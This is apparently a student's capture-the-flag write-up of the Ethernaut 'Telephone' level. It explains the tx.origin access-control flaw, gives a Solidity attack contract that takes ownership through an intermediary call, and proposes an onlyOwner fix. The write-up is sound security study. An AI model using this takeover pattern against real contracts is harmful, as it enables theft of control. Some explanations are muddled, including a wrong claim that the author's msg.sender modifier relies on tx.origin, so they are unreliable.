## Level 4 — Telephone

**Bug Class:** Phishing/tx.origin exploit
**Severity:** [High] (Impact: full, will most likely result in contract take over | Likelihood: Very Likely)

**Reference Tags:** `tx-origin`, `access-control`, `phishing`

---

### The Vulnerability

function changeOwner was designed to become owner of the contract as long as they were not the original caller. The exploit of tx.origin != msg.sender is there is a loop hole - if you use a contract to call this function it regists the msg.sender as the function block not the wallet address.

```
contract Attack {
    address public target;
    address OWNER = 0x5E5B6cF47eC2C3B284eC1B05cb8Da021E00fdaE5;

    constructor(address _target){
        target = _target;
    }

    function hack() public {
    (bool success,) = target.call(abi.encodeWithSignature("changeOwner(address)", OWNER));
    require(success);
    }
}
```
---

### The Exploit

Make a simple attack function and use your wallet public key as the address _owner input for changeOwner

    // Step 1 — write Attack contract (listed above in earlier section)
    // Step 2 — deploy Attack contract on Sepolia testnet, pointed at existing Telephone instance
    // Step 3 — call hack() on the Attack contract
    // Step 4 — Verify address has been changed to you as owner - make sure this works/ verify on-chain

**Why this works:** tx.origin has a strict value of meaning original contract caller, and combined with msg.sender gives strict guidelines of how to behave - which makes it exploitable working around concrete guidelines

---

### The Fix

I think the purpose of the telephone contract is to change owners safely without compromising integrity of contract

there can be a storage element applied so owner would be able to call who else owned the contract, although this is all accessible onchain - this is just common practice not something that would fix exploit

```modifier onlyOwner() {
    require(msg.sender == owner, "not owner");
    _;
}

function changeOwner(address _newOwner) public onlyOwner {
    owner = _newOwner;
}
```

**Why this fix is correct:** 
gets rid of tx.origin completely from the logic - and doesnt use it for ownership secuirty

---

### Severity Reasoning

- **Impact:** Attacker can gain control of contract guarenteed just externally calling the contract from another contract not from wallet to take ownership even though original owner
- **Likelihood:** pretty easily accessible - and is very likely an amateur would figure this out just by understanding purpose of tx.origin and how it is used
- **Rating:** 
- This Instance: This impacts the contracts integrety: obviously the objective is to take control of the contract which doesnt really have much harm - so I would say the only issue is breaking the logic
- Production equivalent: Critical/High I would assume this logic could be used to sell NFT if a bit more complex - perhaps the purpose of transferring a contract from owner to owner is proof of ownership - that being said exploit is very high but simple modifications could help boost secuirty 

---

### Reference Match/Matches

- Finding: "Usage of tx.origin for Access Control Is Unsafe Due to Phishing Risk" — Quantstamp audit of PowerLoom L2, PowerloomDataMarket.sol (April 2025). Solodit
- Why it matches: Identical root cause to Telephone — tx.origin compared directly inside require() guards instead of msg.sender. PowerLoom's version is broader in scope: four separate modifiers (onlyOwnerOrigin, onlySequencer, onlyEpochManager, onlyOwnerOrAdmin) all repeat the same unsafe pattern across different privileged roles, confirming this isn't a CTF-only issue — it recurs in production code, audited by a top-tier firm, at scale across multiple roles.
- Fix alignment: PowerLoom's recommended fix matches the core of this fix — replace tx.origin with msg.sender. Their report goes one step further architecturally: PowerloomDataMarket functions are meant to be called through an intermediary PowerloomProtocolState contract by design, so a flat swap alone would break the intended call flow. 

Their recommendation adds two options: (a) pass the real sender address explicitly as a parameter through the protocol-state layer, or (b) gate PowerloomDataMarket with an onlyProtocolState modifier (msg.sender == protocolStateAddress) while separately locking PowerloomProtocolState itself with onlyOwner. This shows the escalation path: Telephone's fix is a direct swap because there's no legitimate intermediary; PowerLoom needed a second layer of access control specifically because legitimate contract-to-contract calls were part of the design.

---

### What I'd Do Differently

- **Tool check:** 
Not sure what tools would have caught this instantly, most likely Slither I have come to find out is a very great tool to probably worth looking into.
- **Pattern generalization:** 
I have learned that the usage of tx.origin is quite useful and if impliment correctly like in my modifer it would prevent anything besides walelts from accessing the function - this could be learned about more in depth.
- **Missed on first read:** 
I was pretty good at spotting the issue pretty fast and pretty great at writing out the attack contract from scratch. This ethernaut wasnt as hard

---

### Personal Gaps/ Personal Journal [UPDATED October 2 2026]

I'm not sure if this is a Gap but after I know what I had to do, I double checked my logic by just googling it, this might just be standard, but I knew which logic I had to do. So for the most part the only gap was perhaps the actual raw code itself.

I still havent learned about Slither - this tool will come useful in the near future

I am still learning about the Foundry flow- I have wrote down an entire section to get into the Foundation flow - It seems pretty straight forward I assume it will get more commplicated as time goes on. A great plus is I receieve testnet for the hackathon I have attended so this makes using seporlia a lot easier.
